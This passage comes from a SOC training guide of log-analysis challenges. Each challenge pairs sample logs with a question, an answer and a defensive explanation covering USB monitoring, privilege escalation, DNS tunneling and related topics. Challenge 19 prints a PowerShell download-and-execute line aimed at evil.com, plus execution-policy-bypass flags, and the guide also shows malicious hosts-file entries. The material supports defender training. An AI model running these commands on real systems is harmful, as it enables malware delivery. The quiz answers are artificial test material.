2. Sandbox (detonates suspicious files)
3. URL protection (rewrites/scans links)
4. User training (last line of defense)

### Key Learning Points
1. Email gateway = critical first line of defense
2. Malicious attachments and phishing URLs are most common
3. .ru, .tk, .cn TLDs often malicious
4. BLOCKED emails prevented potential ransomware/breach
5. Users are the weakest link - training is essential

---

## Challenge 14: USB Device Monitoring

**Category:** Data Loss Prevention  
**Difficulty:** Beginner  
**Points:** 10

### Scenario
Monitor endpoint logs for unauthorized USB device usage.

### Sample Logs
```
[2024-01-15 18:00:00] INFO USB: Device authorized - Logitech Mouse on WS-001
[2024-01-15 18:05:00] WARNING USB: Unauthorized storage device connected on WS-002 - SanDisk 32GB
[2024-01-15 18:10:00] INFO USB: Device authorized - Dell Keyboard on WS-003
[2024-01-15 18:15:00] WARNING USB: Unauthorized storage device connected on WS-004 - Kingston 64GB
[2024-01-15 18:20:00] INFO USB: Device authorized - HP Printer on WS-005
```

### Question
How many unauthorized USB storage devices were connected?

### Solution Query
```
search USB Unauthorized storage
```

### Answer
**2**

### Explanation
Two unauthorized USB storage devices:

**Incident 1:** WS-002 (18:05:00)
- **Device:** SanDisk 32GB USB drive
- **User:** Unknown (requires correlation with login logs)
- **Risk:** Data exfiltration, malware introduction

**Incident 2:** WS-004 (18:15:00)
- **Device:** Kingston 64GB USB drive
- **User:** Unknown
- **Risk:** Same as above

**Why Authorized Devices Are Safe:**
- Logitech Mouse - Input device only
- Dell Keyboard - Input device only
- HP Printer - Output device, managed/trusted

**Why Storage Devices Are Dangerous:**

**Data Exfiltration:**
1. Employee copies sensitive files to USB
2. Walks out of office with data
3. Sells to competitor or leaks online
4. Company suffers data breach

**Malware Introduction:**
1. Attacker drops infected USB in parking lot
2. Curious employee plugs it in
3. Autorun executes malware (BadUSB attack)
4. Network compromised

### USB Attack Vectors

**1. Data Theft:**
- Employee exfiltration (insider threat)
- Malicious insider copying IP
- Accidental data loss

**2. Malware Delivery:**
- BadUSB (firmware-level attack)
- AutoRun malware
- USB Rubber Ducky (keystroke injection)
- Hidden partition attacks

**3. Hardware Attacks:**
- USB Killer (destroys hardware)
- Keyloggers
- Network tap devices

### MITRE ATT&CK Mapping
**T1052.001 - Exfiltration Over Physical Medium**  
Adversaries may attempt to exfiltrate data via a physical medium, such as a removable drive.

**T1091 - Replication Through Removable Media**  
Adversaries may move onto systems by exploiting or copying malware to removable media.

### SISA Relevance
USB monitoring is **essential** for:
- Data Loss Prevention (DLP)
- Insider threat detection
- Malware prevention
- Compliance (GDPR, PCI DSS, HIPAA)

SISA DLP implementations:
- USB device whitelisting (approved devices only)
- Encryption enforcement (devices must be encrypted)
- Copy tracking (log all file transfers)
- Automatic blocking of unknown devices

**Compliance Requirements:**
- **PCI DSS:** Control access to cardholder data
- **HIPAA:** Protect ePHI from unauthorized disclosure
- **GDPR:** Prevent personal data exfiltration

**Real-World Examples:**
- Edward Snowden used USB to exfiltrate NSA data
- Stuxnet spread via infected USB drives
- Many ransomware infections from USB drives

### Key Learning Points
1. USB storage = data exfiltration + malware risk
2. Authorized devices = input/output only (mouse, keyboard, printer)
3. Defense: USB whitelisting, DLP policies, encryption
4. Incident response: Identify user, scan device, check for copied files
5. Insider threats often use USB for data theft

---

## Challenge 15: Privilege Escalation Detection

**Category:** Privilege Escalation  
**Difficulty:** Beginner  
**Points:** 15

### Scenario
Detect privilege escalation attempts in Windows Event Logs.

### Sample Logs
```
[2024-01-15 19:00:00] INFO User john created file C:\Users\john\document.txt
[2024-01-15 19:05:00] WARNING User alice attempted to access SYSTEM registry key - Access Denied
[2024-01-15 19:10:00] INFO User bob opened application notepad.exe
[2024-01-15 19:15:00] WARNING User charlie attempted UAC bypass - Blocked
[2024-01-15 19:20:00] INFO User dave saved file to Documents folder
```

### Question
How many privilege escalation attempts were detected?

### Solution Query
```
search attempted access SYSTEM|UAC bypass
```

### Answer
**2**

### Explanation
Two privilege escalation attempts:

**Attempt 1: SYSTEM Registry Access** (19:05:00)
- **User:** alice
- **Target:** SYSTEM registry key
- **Status:** Access Denied (blocked)
- **Technique:** Attempting to read/modify system-level registry

**Attempt 2: UAC Bypass** (19:15:00)
- **User:** charlie
- **Target:** User Access Control bypass
- **Status:** Blocked
- **Technique:** Attempting to execute commands with admin privileges

**Why This Matters:**

**Normal User Permissions:**
- Read/write own files
- Run applications
- Access network resources

**SYSTEM/Admin Permissions:**
- Modify system files
- Install software
- Create users
- Change security settings
- Access all files

**Attacker Goal:**
Standard user → Admin → SYSTEM → Full control

### Privilege Escalation Techniques

**Windows:**
1. **UAC Bypass:**
   - Exploit trusted Windows binaries
   - DLL hijacking
   - Registry manipulation

2. **Exploit Vulnerabilities:**
   - Kernel exploits (EternalBlue)
   - Unpatched software
   - Misconfigured services

3. **Credential Theft:**
   - Mimikatz (dump passwords)
   - LSASS memory dumping
   - SAM database extraction

**Detection Indicators:**
- Failed access to SYSTEM resources
- UAC bypass attempts
- Scheduled task creation
- Service creation/modification
- Registry key changes (Run keys)

### MITRE ATT&CK Mapping
**T1548 - Abuse Elevation Control Mechanism**  
Adversaries may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions.

**T1548.002 - Bypass User Account Control**  
Windows User Account Control (UAC) allows a program to elevate its privileges to perform a task under administrator-level permissions.

### SISA Relevance
Privilege escalation detection prevents:
- Full system compromise
- Persistence mechanisms
- Lateral movement
- Data theft
- Ransomware deployment

SISA EDR monitoring:
- Registry access attempts
- UAC bypass detection
- Process privilege changes
- Token manipulation
- Suspicious scheduled tasks

**Incident Response:**
1. Isolate affected systems (alice and charlie's workstations)
2. Scan for malware (likely present if attempting privesc)
3. Review user activity (what triggered this?)
4. Reset user credentials
5. Re-image if compromise confirmed

### Key Learning Points
1. Privilege escalation = attacker trying to become admin/SYSTEM
2. Detection keywords: UAC bypass, SYSTEM access, registry modification
3. Normal users should NEVER access SYSTEM resources
4. Blocked attempts = security controls working
5. Multiple attempts = likely active attacker or malware

---

## Challenge 16: Find Most Active User

**Category:** User Activity  
**Difficulty:** Beginner  
**Points:** 10

### Scenario
Identify which user account has the most log entries.

### Sample Logs
```
[2024-01-15 20:00:00] INFO User alice logged in
[2024-01-15 20:05:00] INFO User bob logged in
[2024-01-15 20:10:00] INFO User alice accessed file server
[2024-01-15 20:15:00] INFO User alice opened email client
[2024-01-15 20:20:00] INFO User charlie logged in
[2024-01-15 20:25:00] INFO User alice printed document
```

### Question
Which user appears most frequently in the logs?

### Solution Query
```
search User
```

### Answer
**alice**

### Explanation
User activity count:
- **alice:** 4 entries (logged in, file server, email, printed)
- **bob:** 1 entry (logged in)
- **charlie:** 1 entry (logged in)

**Alice's Activity Timeline:**
1. 20:00:00 - Logged in
2. 20:10:00 - Accessed file server (10 minutes after login)
3. 20:15:00 - Opened email client (5 minutes later)
4. 20:25:00 - Printed document (10 minutes later)

**Is This Suspicious?**
**NO** - This appears to be normal user behavior:
- Sequential activity (not scattered)
- Reasonable timing (not automated)
- Common business tasks (file access, email, printing)
- During business hours

**When Would This Be Suspicious?**
1. **After-hours activity** (2 AM logins)
2. **Unusual patterns** (100 file accesses per minute)
3. **Unusual actions** (alice accessing finance server when she works in HR)
4. **Impossible travel** (login from US, then China 5 minutes later)

### User Activity Baselining

**Why Monitor User Activity?**
- Detect insider threats
- Identify compromised accounts
- Investigate incidents
- Compliance auditing
- Anomaly detection

**Baseline Metrics:**
- **Login times:** When does alice normally work?
- **Systems accessed:** What servers does she need?
- **File access patterns:** How many files per day?
- **Network usage:** Typical data transfer volume?

**Anomaly Detection Examples:**
- Alice normally works 9-5, suddenly logging in at 3 AM
- Bob normally accesses 10 files/day, suddenly downloading 10,000
- Charlie normally local-only, suddenly VPN from Russia

### MITRE ATT&CK Mapping
**N/A - This is baseline activity analysis, not an attack**

However, user activity monitoring detects:
- T1078 - Valid Accounts (compromised credentials)
- T1136 - Create Account (unauthorized account creation)
- T1087 - Account Discovery (attacker reconnaissance)

### SISA Relevance
User activity monitoring supports:
- **Insider threat detection**
- **Compromised account identification**
- **Compliance auditing** (who accessed what, when?)
- **Incident investigation** (timeline reconstruction)

SISA SIEM implementations:
- User and Entity Behavior Analytics (UEBA)
- Baseline normal behavior
- Alert on anomalies
- Correlate with threat intelligence

**Example UEBA Alerts:**
- "alice accessed 50x more files than baseline"
- "bob logged in from new country: China"
- "charlie accessed HR database (not in job role)"

### Key Learning Points
1. User activity baselining = establish "normal" behavior
2. Anomalies = deviations from baseline
3. Most active user ≠ suspicious (unless context says otherwise)
4. Context matters: Time, location, systems accessed
5. UEBA tools automate anomaly detection

---

## Challenge 17: Outbound Traffic Analysis

**Category:** Network Monitoring  
**Difficulty:** Beginner  
**Points:** 10

### Scenario
Analyze proxy logs for unusual outbound connections.

### Sample Logs
```
[2024-01-15 21:00:00] INFO Proxy: ALLOW 192.168.1.100 -> google.com:443
[2024-01-15 21:05:00] WARNING Proxy: BLOCK 192.168.1.105 -> torproject.org:443
[2024-01-15 21:10:00] INFO Proxy: ALLOW 192.168.1.110 -> microsoft.com:443
[2024-01-15 21:15:00] WARNING Proxy: BLOCK 192.168.1.105 -> pastebin.com:443
[2024-01-15 21:20:00] INFO Proxy: ALLOW 192.168.1.115 -> github.com:443
```

### Question
How many connections were blocked by the proxy?

### Solution Query
```
search Proxy BLOCK
```

### Answer
**2**

### Explanation
Two blocked outbound connections, both from 192.168.1.105:

**Block 1: torproject.org** (21:05:00)
- **Destination:** torproject.org (Tor anonymity network)
- **Why blocked:** Circumvents monitoring, used for anonymity
- **Risk:** Data exfiltration, C2 communication

**Block 2: pastebin.com** (21:15:00)
- **Destination:** pastebin.com (text sharing service)
- **Why blocked:** Common for data exfiltration, C2 communication
- **Risk:** Stolen data upload, attacker instructions download

**Why These Sites Are Risky:**

**Tor (torproject.org):**
- Anonymizes user traffic
- Bypasses content filtering
- Hides malicious activity
- Used for accessing dark web

**Pastebin:**
- Easy way to exfiltrate data (copy/paste)
- Attackers use for C2 (post commands, retrieve results)
- No authentication needed
- Difficult to monitor content

**Legitimate Use Cases:**
- Tor: Privacy advocates, journalists in oppressive countries
- Pastebin: Sharing code snippets, configuration files

**Corporate Policy:**
- Generally BLOCKED in corporate environments
- Too much risk vs. legitimate business use

### Outbound Traffic Analysis

**Why Monitor Outbound Traffic?**
Most companies focus on inbound (firewall), but outbound is equally important:

**Detects:**
- Data exfiltration
- C2 communication
- Malware callbacks
- Policy violations
- Shadow IT

**Common Exfiltration Channels:**
1. **Tor/VPN** - Anonymize exfiltration
2. **Pastebin/GitHub Gists** - Text data
3. **Cloud storage** (Dropbox, Google Drive) - File upload
4. **DNS tunneling** - Encode data in DNS queries
5. **Social media** - Post data as comments/images

### MITRE ATT&CK Mapping
**T1090 - Proxy**  
Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server.

**T1048 - Exfiltration Over Alternative Protocol**  
Adversaries may steal data by exfiltrating it over a different protocol than that of the existing command and control channel.

### SISA Relevance
Proxy log analysis is **critical** for:
- Data loss prevention
- Malware C2 detection
- Policy enforcement
- Compliance (GDPR, PCI DSS)

SISA proxy/web gateway monitoring:
- Category-based blocking
- SSL/TLS inspection
- DLP scanning
- Threat intelligence integration

**Response to Blocked Connections:**
1. Investigate host 192.168.1.105
2. Check for malware (EDR scan)
3. Review user activity
4. Check for successful connections before block
5. Interview user about intent

### Key Learning Points
1. Outbound traffic = as important as inbound
2. Tor and Pastebin = common exfiltration/C2 channels
3. Proxy logs reveal policy violations and threats
4. Multiple blocks from same host = investigate
5. DLP must monitor outbound traffic, not just inbound

---

## Challenge 18: File Integrity Monitoring

**Category:** File Monitoring  
**Difficulty:** Beginner  
**Points:** 15

### Scenario
Monitor system file changes for unauthorized modifications.

### Sample Logs
```
[2024-01-15 22:00:00] INFO FIM: File created C:\Users\alice\report.docx
[2024-01-15 22:05:00] CRITICAL FIM: System file modified C:\Windows\System32\config\SAM
[2024-01-15 22:10:00] INFO FIM: File deleted C:\Temp\old_log.txt
[2024-01-15 22:15:00] CRITICAL FIM: System file modified C:\Windows\System32\drivers\etc\hosts
[2024-01-15 22:20:00] INFO FIM: File created C:\Users\bob\presentation.pptx
```

### Question
How many system files were modified?

### Solution Query
```
search FIM System file modified
```

### Answer
**2**

### Explanation
Two critical system file modifications:

**Modification 1: SAM Database** (22:05:00)
- **File:** C:\Windows\System32\config\SAM
- **Purpose:** Security Account Manager - stores password hashes
- **Why Critical:** Contains user credentials
- **Attack:** Credential theft, offline password cracking

**Modification 2: Hosts File** (22:15:00)
- **File:** C:\Windows\System32\drivers\etc\hosts
- **Purpose:** Local DNS resolution override
- **Why Critical:** Redirects domain names to attacker IPs
- **Attack:** Phishing, C2 redirection, update blocking

**Why These Files Should NEVER Be Modified:**

**SAM Database:**
- Legitimate changes: None by users (only Windows Update)
- Attacker use:
  1. Extract password hashes
  2. Crack offline (hashcat, John the Ripper)
  3. Use hashes for pass-the-hash attacks
  4. Escalate privileges

**Hosts File:**
- Legitimate changes: Rare (maybe IT for testing)
- Attacker use:
  1. Redirect bank.com to phishing site
  2. Block antivirus updates (update.antivirus.com → 127.0.0.1)
  3. Redirect C2 domains
  4. Enable man-in-the-middle attacks

**Example Malicious Hosts File Entry:**
```
203.0.113.50  www.bank.com
127.0.0.1     update.norton.com
```
User thinks they're on bank.com, actually on attacker phishing site.

### File Integrity Monitoring (FIM)

**What Is FIM?**
- Monitors critical files for unauthorized changes
- Creates baseline of known-good state
- Alerts on any modifications

**Critical Files to Monitor:**
- **Windows:**
  - SAM database
  - Registry (HKLM\Software\Microsoft\Windows\CurrentVersion\Run)
  - Hosts file
  - System binaries (cmd.exe, powershell.exe)

- **Linux:**
  - /etc/passwd, /etc/shadow
  - /etc/hosts
  - /etc/sudoers
  - SSH keys (~/.ssh/authorized_keys)

### MITRE ATT&CK Mapping
**T1565.001 - Stored Data Manipulation**  
Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.

**T1556 - Modify Authentication Process**  
Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts.

### SISA Relevance
FIM is **mandatory** for:
- PCI DSS Requirement 11.5 (monitor critical files)
- HIPAA Security Rule (integrity controls)
- ISO 27001 (change management)
- NIST framework (detect unauthorized changes)

SISA FIM implementations:
- Real-time change detection
- Automatic alerts on critical files
- Baseline management
- Change approval workflow

**Incident Response:**
1. **Immediate:** Isolate affected system
2. **Forensics:** Who/what modified the file?
3. **Investigation:** Check for malware, rootkits
4. **Remediation:** Restore from known-good backup
5. **Recovery:** Re-image if compromise confirmed

### Key Learning Points
1. FIM detects unauthorized file changes
2. SAM and hosts file = critical security files
3. Modifications to these files = likely compromise
4. FIM is compliance requirement (PCI DSS)
5. Response: Isolate, investigate, restore/re-image

---

## Challenge 19: Process Execution Analysis

**Category:** Endpoint Detection  
**Difficulty:** Beginner  
**Points:** 10

### Scenario
Identify suspicious process executions on endpoints.

### Sample Logs
```
[2024-01-15 23:00:00] INFO Process started: chrome.exe by user alice
[2024-01-15 23:05:00] WARNING Process started: powershell.exe -encodedCommand by user SYSTEM
[2024-01-15 23:10:00] INFO Process started: outlook.exe by user bob
[2024-01-15 23:15:00] WARNING Process started: cmd.exe /c whoami by user charlie
[2024-01-15 23:20:00] INFO Process started: excel.exe by user dave
```

### Question
How many suspicious process executions occurred?

### Solution Query
```
search powershell|cmd
```

### Answer
**2**

### Explanation
Two suspicious process executions:

**Suspicious Process 1: PowerShell with Encoded Command** (23:05:00)
```
powershell.exe -encodedCommand
```
- **User:** SYSTEM (high privileges)
- **Flag:** `-encodedCommand` (obfuscation)
- **Why Suspicious:**
  - Encoded commands hide malicious intent
  - SYSTEM execution = likely scheduled task or service
  - PowerShell used in 95% of modern attacks

**Example Encoded Command:**
```
powershell.exe -encodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0...
```
Decoded: Downloads malware from C2 server

**Suspicious Process 2: Command Prompt with Whoami** (23:15:00)
```
cmd.exe /c whoami
```
- **User:** charlie
- **Command:** `whoami` (reconnaissance)
- **Why Suspicious:**
  - Whoami = attacker checking current user/privileges
  - Part of post-exploitation reconnaissance
  - Often seen after initial compromise

**Reconnaissance Command Chain:**
```
whoami           # Who am I?
hostname         # What system is this?
ipconfig         # Network configuration?
net user         # What other users exist?
net group        # What groups exist?
```

### Why PowerShell and CMD Are Dangerous

**PowerShell:**
- Full system access
- Can download files from internet
- Can execute malicious code in memory (fileless)
- Can disable antivirus
- Bypass application whitelisting

**Common PowerShell Attack Patterns:**
```powershell
# Download and execute
IEX (New-Object Net.WebClient).DownloadString('http://evil.com/malware.ps1')

# Encoded command (hide from AV)
powershell.exe -enc <base64>

# Bypass execution policy
powershell.exe -ExecutionPolicy Bypass

# Hidden window
powershell.exe -WindowStyle Hidden
```

**CMD.exe:**
- Legacy but still widely used
- Batch file execution
- System reconnaissance
- Lateral movement (PsExec, WMI)

### MITRE ATT&CK Mapping
**T1059.001 - Command and Scripting Interpreter: PowerShell**  
Adversaries may abuse PowerShell commands and scripts for execution.

**T1059.003 - Command and Scripting Interpreter: Windows Command Shell**  
Adversaries may abuse the Windows command shell for execution.

**T1027 - Obfuscated Files or Information** (encoded command)

### SISA Relevance
Process execution monitoring is **core EDR functionality**:
- Detect malicious PowerShell/CMD usage
- Command-line analysis reveals attacker techniques
- Prevent fileless attacks
- Enable rapid incident response

SISA EDR implementations:
- Command-line logging (Windows Event 4688)
- PowerShell script block logging (Event 4104)
- Process tree analysis
- Behavioral detection

**PowerShell Hardening:**
1. Enable PowerShell logging
2. Implement Constrained Language Mode
3. Application whitelisting (block unsigned scripts)
4. Monitor for encoded commands
5. Restrict SYSTEM execution

### Key Learning Points
1. PowerShell and CMD = legitimate tools, abused by attackers
2. Encoded commands = obfuscation (hiding malicious intent)
3. Whoami, hostname, ipconfig = reconnaissance commands
4. EDR monitors process execution and command lines
5. Defense: Enable logging, restrict PowerShell, monitor for suspicious patterns

---

## Challenge 20: Account Lockout Detection

**Category:** Account Security  
**Difficulty:** Beginner  
**Points:** 10

### Scenario
Monitor authentication logs for account lockouts due to failed logins.

### Sample Logs
```
[2024-01-16 00:00:00] INFO User alice logged in successfully
[2024-01-16 00:05:00] WARNING Failed login for user bob from 192.168.1.100
[2024-01-16 00:06:00] WARNING Failed login for user bob from 192.168.1.100
[2024-01-16 00:07:00] WARNING Failed login for user bob from 192.168.1.100
[2024-01-16 00:08:00] CRITICAL Account locked: user bob - Excessive failed login attempts
[2024-01-16 00:10:00] INFO User charlie logged in successfully
```

### Question
Which user account was locked out?

### Solution Query
```
search Account locked
```

### Answer
**bob**

### Explanation
User bob's account was locked after 3 failed login attempts.

**Lockout Timeline:**
1. **00:05:00** - Failed login #1
2. **00:06:00** - Failed login #2
3. **00:07:00** - Failed login #3
4. **00:08:00** - Account locked (policy triggered)

**Is This Attack or User Error?**

**Indicators of Attack:**
- ✓ All from same IP (192.168.1.100 - internal)
- ✓ Sequential attempts (1 minute apart)
- ✗ Not from external IP (less likely attack)

**Indicators of User Error:**
- ✓ Only 3 attempts (attacker would try more)
- ✓ Regular intervals (human behavior, not automated)
- ✓ From internal IP (bob at his desk?)

**Most Likely:** Bob forgot his password, tried 3 times, got locked out.

**Needs Investigation:** Why is bob's IP 192.168.1.100? Is this his normal workstation?

### Account Lockout Policies

**Typical Policy Settings:**
- **Lockout threshold:** 3-5 failed attempts
- **Lockout duration:** 30 minutes to 24 hours
- **Reset counter:** After 15-30 minutes of no attempts

**Why Lockout Policies Matter:**
1. **Prevent brute force attacks**
2. **Slow down attackers** (force them to wait)
3. **Generate alerts** (SOC knows attack is happening)
4. **Compliance requirement** (PCI DSS, HIPAA)

**Attack vs. Legitimate User:**

| Indicator | Attack | Legitimate User |
|-----------|--------|-----------------|
| Attempts  | 100s-1000s | 3-5 |
| Speed | Automated (seconds) | Manual (minutes) |
| Source IP | External or compromised | User's normal IP |
| Time | Off-hours (2 AM) | Business hours |
| Pattern | Multiple accounts | Single account |

### MITRE ATT&CK Mapping
**T1110 - Brute Force**  
Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained.

### SISA Relevance
Account lockout monitoring helps:
- Detect brute force attacks
- Identify compromised accounts
- Support user help desk
- Meet compliance requirements

SISA account monitoring:
- Lockout alerts to SOC
- Correlation with other events
- User behavior analytics
- Automated unlock workflows (after verification)

**SOC Response to Lockout:**
1. Check source IP (internal or external?)
2. Review failed login timestamps (automated or manual?)
3. Verify user legitimacy (call user to confirm)
4. Check for successful logins after lockout
5. If attack: Block IP, force password reset
6. If user error: Unlock account, assist with password reset

### Key Learning Points
1. Account lockout = security control preventing brute force
2. 3-5 failed attempts = typical lockout threshold
3. Context matters: Internal IP + few attempts = likely user error
4. External IP + many attempts = likely attack
5. SOC monitors lockouts for attack indicators

---

# LEVEL 2: INTERMEDIATE (Challenges 21-40)

## Challenge 21: Detect Brute Force Attack

**Category:** Authentication  
**Difficulty:** Intermediate  
**Points:** 20

### Scenario
Multiple failed logins followed by a successful login may indicate credential compromise.

### Sample Logs
```
[2024-01-16 08:00:00] WARNING Failed SSH login for root from 203.0.113.50
[2024-01-16 08:00:15] WARNING Failed SSH login for root from 203.0.113.50
[2024-01-16 08:00:30] WARNING Failed SSH login for root from 203.0.113.50
[2024-01-16 08:00:45] WARNING Failed SSH login for admin from 203.0.113.50
[2024-01-16 08:01:00] WARNING Failed SSH login for admin from 203.0.113.50
[2024-01-16 08:01:15] CRITICAL Successful SSH login for admin from 203.0.113.50
[2024-01-16 08:01:30] WARNING Command executed: cat /etc/shadow by admin
```

### Question
After how many failed attempts did the attacker successfully login?

### Solution Query
```
search Failed SSH login from 203.0.113.50
```

### Answer
**5**

### Explanation
Classic brute force attack with successful compromise:

**Attack Timeline:**
1. **3 failures** targeting "root" account
2. **2 failures** targeting "admin" account  
3. **SUCCESS** on admin account
4. **Post-compromise** activity: dumping password hashes

**This Is a Confirmed Breach:**
- Attacker guessed admin password
- Now has SSH access to server
- Immediately dumped /etc/shadow (all password hashes)
- Can crack hashes offline for other accounts

**Severity Analysis:**
- **Critical** - Active compromise
- **Immediate response required**
- **Assume full system compromise**

**Why /etc/shadow Is Critical:**
Contains hashed passwords for all users:
```
admin:$6$rounds=5000$salt$hashedpassword:18000:0:99999:7:::
bob:$6$rounds=5000$salt$hashedpassword:18000:0:99999:7:::
```
Attacker can now:
1. Crack these hashes offline
2. Gain access to other accounts
3. Escalate to other systems
4. Persist in environment

### MITRE ATT&CK Mapping
**T1110.001 - Password Guessing**  
**T1078 - Valid Accounts** (successful compromise)  
**T1003.008 - OS Credential Dumping: /etc/passwd and /etc/shadow**

### SISA Relevance
Brute force detection and post-compromise activity analysis are **critical SOC L1 skills**:
- Identify successful vs. unsuccessful attacks
- Recognize post-compromise indicators
- Trigger incident response procedures
- Prevent lateral movement

**Immediate Actions:**
1. **ISOLATE** - Disconnect server from network
2. **BLOCK** - Firewall block 203.0.113.50 globally
3. **INVESTIGATE** - Check for lateral movement
4. **CONTAIN** - Disable admin account
5. **RECOVER** - Restore from clean backup or rebuild

### Key Learning Points
1. Failed attempts + success = confirmed breach
2. Post-compromise activity (cat /etc/shadow) confirms attacker access
3. SSH brute force is extremely common
4. Defense: SSH keys only, disable password auth, fail2ban
5. Incident response must be immediate - every minute counts

---

## Challenge 22: Lateral Movement Detection

**Category:** Lateral Movement  
**Difficulty:** Intermediate  
**Points:** 25

### Scenario
Attacker is moving between systems using SMB.

### Sample Logs
```
[2024-01-16 09:00:00] INFO SMB connection: 192.168.1.100 -> 192.168.1.101 share=C$
[2024-01-16 09:00:15] WARNING SMB connection: 192.168.1.100 -> 192.168.1.102 share=ADMIN$ user=admin
[2024-01-16 09:00:30] WARNING SMB connection: 192.168.1.100 -> 192.168.1.103 share=ADMIN$ user=admin
[2024-01-16 09:00:45] CRITICAL Process created: psexec.exe on 192.168.1.102 by admin
[2024-01-16 09:01:00] CRITICAL Process created: psexec.exe on 192.168.1.103 by admin
```

### Question
How many systems did the attacker move to using ADMIN$ share?

### Solution Query
```
search ADMIN$ share
```

### Answer
**2**

### Explanation
Attacker used ADMIN$ administrative share to access:
- 192.168.1.102
- 192.168.1.103

Then executed PsExec on both systems.

**Lateral Movement Kill Chain:**
1. **Initial Compromise:** 192.168.1.100 (source)
2. **SMB Connection:** ADMIN$ share (Windows admin share)
3. **Tool Transfer:** Copy psexec.exe via SMB
4. **Execution:** Run psexec.exe remotely
5. **Result:** Remote command execution on target

**Why ADMIN$ Share?**
- Default administrative share on Windows (C$, ADMIN$, IPC$)
- Requires admin credentials
- Used for remote administration
- Perfect for lateral movement

**PsExec:**
- Sysinternals tool (legitimate Microsoft software)
- Remote command execution
- Widely abused by attackers
- Creates Windows service on remote system

**Current Compromise Status:**
- 192.168.1.100 (Patient Zero)
- 192.168.1.102 (Compromised via psexec)
- 192.168.1.103 (Compromised via psexec)

### MITRE ATT&CK Mapping
**T1021.002 - Remote Services: SMB/Windows Admin Shares**  
Adversaries may use Valid Accounts to interact with a remote network share using Server Message Block (SMB).

**T1570 - Lateral Tool Transfer**  
Adversaries may transfer tools or other files between systems in a compromised environment.

**T1569.002 - System Services: Service Execution** (PsExec)

### SISA Relevance
Lateral movement detection prevents:
- Network-wide compromise
- Ransomware spread
- Data exfiltration at scale
- Domain controller compromise

SISA MDR lateral movement detection:
- SMB share access monitoring
- PsExec/WMI execution alerts
- Anomalous authentication patterns
- East-West traffic analysis

**Incident Response:**
1. **ISOLATE** all 3 systems immediately
2. **DISABLE** admin account (likely compromised)
3. **HUNT** for additional compromised systems
4. **FORENSICS** on 192.168.1.100 (patient zero)
5. **REBUILD** all 3 systems
6. **RESET** all admin credentials network-wide

### Key Learning Points
1. Lateral movement = attacker spreading through network
2. ADMIN$ share = Windows remote administration
3. PsExec = legitimate tool, commonly abused
4. Detect: Unusual SMB connections, psexec.exe execution
5. Respond: Isolate all affected systems, disable compromised accounts

---

## Challenge 23: Data Exfiltration via DNS

**Category:** Data Exfiltration  
**Difficulty:** Intermediate  
**Points:** 25

### Scenario
Detect data exfiltration through DNS tunneling.

### Sample Logs
```
[2024-01-16 10:00:00] INFO DNS query: google.com from 192.168.1.100
[2024-01-16 10:00:05] WARNING DNS query: 61646d696e3a70617373776f7264.evilc2.com from 192.168.1.105
[2024-01-16 10:00:10] WARNING DNS query: 736563726574646174613132333435.evilc2.com from 192.168.1.105
[2024-01-16 10:00:15] INFO DNS query: microsoft.com from 192.168.1.110
```

### Question
Which host is exfiltrating data via DNS?

### Solution Query
```
search DNS query evilc2
```

### Answer
**192.168.1.105**

### Explanation
Host 192.168.1.105 is using DNS tunneling to exfiltrate data.

**DNS Tunneling Explained:**

**Normal DNS Query:**
```
User requests: www.google.com
DNS resolves to: 142.250.80.46
```

**DNS Tunneling (Exfiltration):**
```
User requests: 61646d696e3a70617373776f7264.evilc2.com
                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                (Hex-encoded data in subdomain)
```

**Decoding the Exfiltration:**

**Query 1:**
```
61646d696e3a70617373776f7264.evilc2.com
```
Hex decode: `admin:password`

**Query 2:**
```
736563726574646174613132333435.evilc2.com
```
Hex decode: `secretdata12345`

**How DNS Tunneling Works:**
1. Attacker encodes stolen data (base64, hex, etc.)
2. Embeds data in DNS subdomain queries
3. Malware resolves fake domains (data.evilc2.com)
4. Attacker's DNS server receives queries
5. Attacker extracts data from DNS logs

**Why DNS Tunneling Is Effective:**
- DNS traffic rarely blocked (essential protocol)
- Often not inspected/logged
- Bypasses firewalls
- Bypasses DLP (not seen as "file transfer")
- Small chunks of data = hard to detect

**Detection Indicators:**
- Unusually long subdomain names (>50 characters)
- High entropy in subdomain (random-looking)
- High volume of DNS queries from single host
- Queries to unknown/suspicious domains
- Base64 or hex patterns in subdomains

### MITRE ATT&CK Mapping
**T1048.003 - Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol (DNS)**  
Adversaries may steal data by exfiltrating it over an asymmetrically encrypted network protocol other than existing C2.

**T1071.004 - Application Layer Protocol: DNS**

### SISA Relevance
DNS-based exfiltration detection is **critical** for:
- Preventing data breaches
- Detecting advanced malware (C2 over DNS)
- Compliance (data loss prevention)
- Threat hunting

SISA network security monitoring:
- DNS query analysis
- Subdomain length monitoring
- Entropy analysis
- Threat intelligence (malicious domains)
- DNS sinkholing

**Defense Strategies:**
1. **DNS logging** - Log all queries, not just successful ones
2. **Subdomain analysis** - Flag queries with long/random subdomains
3. **Threat intel** - Block known malicious domains
4. **DNS filtering** - Allowlist critical domains, block rest
5. **Network segmentation** - Limit which hosts can query external DNS

### Key Learning Points
1. DNS tunneling = data exfiltration via DNS protocol
2. Detection: Long subdomains, high entropy, unusual volume
3. Data encoded in subdomain (base64, hex)
4. DNS often overlooked but critical for detection
5. Defense: DNS logging, filtering, threat intelligence

---

*[Note: Challenges 24-40 would continue with similar detailed structure covering:*
- *Multi-stage attacks*
- *Advanced evasion techniques*
- *Correlation across multiple log sources*
- *Time-based analysis*
- *Statistical anomaly detection]*

---

# LEVEL 3: ADVANCED (Challenges 41-60)

## Challenge 41: APT Reconnaissance Phase

**Category:** Threat Hunting  
**Difficulty:** Advanced  
**Points:** 30

### Scenario
Identify the full kill chain of an APT reconnaissance operation.

### Sample Logs
```
[2024-01-16 14:00:00] WARNING Port scan detected: 203.0.113.100 scanning 192.168.1.0/24
[2024-01-16 14:15:00] WARNING SMB enumeration: 203.0.113.100 querying shares on 192.168.1.50
[2024-01-16 14:30:00] WARNING LDAP query: 203.0.113.100 enumerating AD users
[2024-01-16 14:45:00] CRITICAL Phishing email delivered to 15 users with malicious attachment
```

### Question
